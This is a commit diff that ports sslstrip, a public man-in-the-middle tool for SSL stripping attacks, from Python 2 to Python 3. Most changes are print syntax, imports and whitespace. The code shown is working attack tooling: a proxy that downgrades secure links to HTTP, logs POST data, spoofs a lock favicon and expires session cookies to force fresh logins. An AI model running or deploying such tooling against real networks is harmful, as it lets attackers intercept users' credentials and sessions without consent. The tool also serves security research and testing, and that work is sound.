e55dcdbddecd829912c8d956aa75155190dc524f
L1ghtn1ng <jay@cybermon.uk>
2021-11-13 09:34:16 +0000

    Port sslstrip to py3

--- sslstrip.py
+++ sslstrip.py
@@ -1,10 +1,10 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
- 
+
 __author__ = "Moxie Marlinspike"
-__email__  = "moxie@thoughtcrime.org"
-__license__= """
+__email__ = "moxie@thoughtcrime.org"
+__license__ = """
 Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
  
 This program is free software; you can redistribute it and/or
@@ -33,32 +33,34 @@ from sslstrip.CookieCleaner import CookieCleaner
 
 import sys, getopt, logging, traceback, string, os
 
-gVersion = "0.9"
+gVersion = "1.0"
+
 
 def usage():
-    print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
-    print "Usage: sslstrip <options>\n"
-    print "Options:"
-    print "-w <filename>, --write=<filename> Specify file to log to (optional)."
-    print "-p , --post                       Log only SSL POSTs. (default)"
-    print "-s , --ssl                        Log all SSL traffic to and from server."
-    print "-a , --all                        Log all SSL and HTTP traffic to and from server."
-    print "-l <port>, --listen=<port>        Port to listen on (default 10000)."
-    print "-f , --favicon                    Substitute a lock favicon on secure requests."
-    print "-k , --killsessions               Kill sessions in progress."
-    print "-h                                Print this help message."
-    print ""
+    print("\nsslstrip " + gVersion + " by Moxie Marlinspike")
+    print("Usage: sslstrip <options>\n")
+    print("Options:")
+    print("-w <filename>, --write=<filename> Specify file to log to (optional).")
+    print("-p , --post                       Log only SSL POSTs. (default)")
+    print("-s , --ssl                        Log all SSL traffic to and from server.")
+    print("-a , --all                        Log all SSL and HTTP traffic to and from server.")
+    print("-l <port>, --listen=<port>        Port to listen on (default 10000).")
+    print("-f , --favicon                    Substitute a lock favicon on secure requests.")
+    print("-k , --killsessions               Kill sessions in progress.")
+    print("-h                                Print this help message.")
+    print("")
+
 
 def parseOptions(argv):
-    logFile      = 'sslstrip.log'
-    logLevel     = logging.WARNING
-    listenPort   = 10000
+    logFile = 'sslstrip.log'
+    logLevel = logging.WARNING
+    listenPort = 10000
     spoofFavicon = False
     killSessions = False
-    
-    try:                                
-        opts, args = getopt.getopt(argv, "hw:l:psafk", 
-                                   ["help", "write=", "post", "ssl", "all", "listen=", 
+
+    try:
+        opts, args = getopt.getopt(argv, "hw:l:psafk",
+                                   ["help", "write=", "post", "ssl", "all", "listen=",
                                     "favicon", "killsessions"])
 
         for opt, arg in opts:
@@ -80,29 +82,31 @@ def parseOptions(argv):
             elif opt in ("-k", "--killsessions"):
                 killSessions = True
 
-        return (logFile, logLevel, listenPort, spoofFavicon, killSessions)
-                    
-    except getopt.GetoptError:           
-        usage()                          
-        sys.exit(2)                         
+        return logFile, logLevel, listenPort, spoofFavicon, killSessions
+
+    except getopt.GetoptError:
+        usage()
+        sys.exit(2)
+
 
 def main(argv):
     (logFile, logLevel, listenPort, spoofFavicon, killSessions) = parseOptions(argv)
-        
+
     logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                         filename=logFile, filemode='w')
 
     URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
     CookieCleaner.getInstance().setEnabled(killSessions)
 
-    strippingFactory              = http.HTTPFactory(timeout=10)
-    strippingFactory.protocol     = StrippingProxy
+    strippingFactory = http.HTTPFactory(timeout=10)
+    strippingFactory.protocol = StrippingProxy
 
     reactor.listenTCP(int(listenPort), strippingFactory)
-                
-    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."
+
+    print("\nsslstrip " + gVersion + " by Moxie Marlinspike running...")
 
     reactor.run()
+
 
 if __name__ == '__main__':
     main(sys.argv[1:])
--- sslstrip/ClientRequest.py
+++ sslstrip/ClientRequest.py
@@ -16,39 +16,41 @@
 # USA
 #
 
-import urlparse, logging, os, sys, random
-
+import urllib.parse
+import logging
+import os
+import sys
+import random
 from twisted.web.http import Request
 from twisted.web.http import HTTPChannel
 from twisted.web.http import HTTPClient
-
 from twisted.internet import ssl
 from twisted.internet import defer
 from twisted.internet import reactor
 from twisted.internet.protocol import ClientFactory
+from .ServerConnectionFactory import ServerConnectionFactory
+from .ServerConnection import ServerConnection
+from .SSLServerConnection import SSLServerConnection
+from .URLMonitor import URLMonitor
+from .CookieCleaner import CookieCleaner
+from .DnsCache import DnsCache
 
-from ServerConnectionFactory import ServerConnectionFactory
-from ServerConnection import ServerConnection
-from SSLServerConnection import SSLServerConnection
-from URLMonitor import URLMonitor
-from CookieCleaner import CookieCleaner
-from DnsCache import DnsCache
 
 class ClientRequest(Request):
-
-    ''' This class represents incoming client requests and is essentially where
+    """ This class represents incoming client requests and is essentially where
     the magic begins.  Here we remove the client headers we dont like, and then
     respond with either favicon spoofing, session denial, or proxy through HTTP
     or SSL to the server.
-    '''    
-    
+    """
+
     def __init__(self, channel, queued, reactor=reactor):
         Request.__init__(self, channel, queued)
-        self.reactor       = reactor
-        self.urlMonitor    = URLMonitor.getInstance()
+        self.reactor = reactor
+        self.urlMonitor = URLMonitor.getInstance()
         self.cookieCleaner = CookieCleaner.getInstance()
-        self.dnsCache      = DnsCache.getInstance()
-#        self.uniqueId      = random.randint(0, 10000)
+        self.dnsCache = DnsCache.getInstance()
+
+    #        self.uniqueId      = random.randint(0, 10000)
 
     def cleanHeaders(self):
         headers = self.getAllHeaders().copy()
@@ -65,44 +67,46 @@ class ClientRequest(Request):
         return headers
 
     def getPathFromUri(self):
-        if (self.uri.find("http://") == 0):
+        if self.uri.find("http://") == 0:
             index = self.uri.find('/', 7)
             return self.uri[index:]
 
-        return self.uri        
+        return self.uri
 
     def getPathToLockIcon(self):
-        if os.path.exists("lock.ico"): return "lock.ico"
+        if os.path.exists("lock.ico"):
+            return "lock.ico"
 
         scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
         scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")
 
-        if os.path.exists(scriptPath): return scriptPath
+        if os.path.exists(scriptPath):
+            return scriptPath
 
         logging.warning("Error: Could not find lock.ico")
-        return "lock.ico"        
+        return "lock.ico"
 
     def handleHostResolvedSuccess(self, address):
         logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
-        host              = self.getHeader("host")
-        headers           = self.cleanHeaders()
-        client            = self.getClientIP()
-        path              = self.getPathFromUri()
+        host = self.getHeader("host")
+        headers = self.cleanHeaders()
+        client = self.getClientIP()
+        path = self.getPathFromUri()
 
-        self.content.seek(0,0)
-        postData          = self.content.read()
-        url               = 'http://' + host + path
+        self.content.seek(0, 0)
+        postData = self.content.read()
+        url = 'http://' + host + path
 
         self.dnsCache.cacheResolution(host, address)
 
-        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
+        if not self.cookieCleaner.isClean(self.method, client, host, headers):
             logging.debug("Sending expired cookies...")
             self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                     host, headers, path))
-        elif (self.urlMonitor.isSecureFavicon(client, path)):
+        elif self.urlMonitor.isSecureFavicon(client, path):
             logging.debug("Sending spoofed favicon response...")
             self.sendSpoofedFaviconResponse()
-        elif (self.urlMonitor.isSecureLink(client, url)):
+        elif self.urlMonitor.isSecureLink(client, url):
             logging.debug("Sending request via SSL...")
             self.proxyViaSSL(address, self.method, path, postData, headers,
                              self.urlMonitor.getSecurePort(client, url))
@@ -126,39 +130,39 @@ class ClientRequest(Request):
 
     def process(self):
         logging.debug("Resolving host: %s" % (self.getHeader('host')))
-        host     = self.getHeader('host')               
+        host = self.getHeader('host')
         deferred = self.resolveHost(host)
 
         deferred.addCallback(self.handleHostResolvedSuccess)
         deferred.addErrback(self.handleHostResolvedError)
-        
+
     def proxyViaHTTP(self, host, method, path, postData, headers):
-        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
+        connectionFactory = ServerConnectionFactory(method, path, postData, headers, self)
         connectionFactory.protocol = ServerConnection
         self.reactor.connectTCP(host, 80, connectionFactory)
 
     def proxyViaSSL(self, host, method, path, postData, headers, port):
-        clientContextFactory       = ssl.ClientContextFactory()
-        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
+        clientContextFactory = ssl.ClientContextFactory()
+        connectionFactory = ServerConnectionFactory(method, path, postData, headers, self)
         connectionFactory.protocol = SSLServerConnection
         self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
 
     def sendExpiredCookies(self, host, path, expireHeaders):
-        self.setResponseCode(302, "Moved")
+        self.setResponseCode(302)
         self.setHeader("Connection", "close")
         self.setHeader("Location", "http://" + host + path)
-        
+
         for header in expireHeaders:
             self.setHeader("Set-Cookie", header)
 
-        self.finish()        
-        
+        self.finish()
+
     def sendSpoofedFaviconResponse(self):
         icoFile = open(self.getPathToLockIcon())
 
-        self.setResponseCode(200, "OK")
+        self.setResponseCode(200)
         self.setHeader("Content-type", "image/x-icon")
         self.write(icoFile.read())
-                
+
         icoFile.close()
         self.finish()
